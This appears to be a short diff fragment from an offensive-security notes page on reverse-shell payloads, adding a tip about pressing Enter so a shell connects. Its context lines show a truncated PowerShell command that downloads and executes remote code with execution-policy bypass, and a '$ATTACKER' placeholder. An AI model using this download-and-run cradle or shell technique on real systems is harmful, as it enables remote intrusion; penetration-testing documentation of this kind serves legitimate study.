@@ -10,6 +10,10 @@ powershell  -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).Download
 cmd.exe payload is more reliable and preferred than the Powershell payload below.
 {% endhint %}
 
+{% hint style="danger" %}
+Note it may be necessary to press `Enter` a couple times after the connection is established. Otherwise shell may not be sent successfully.
+{% endhint %}
+
 ## Powershell \(.ps1 file\)
 
 $ATTACKER
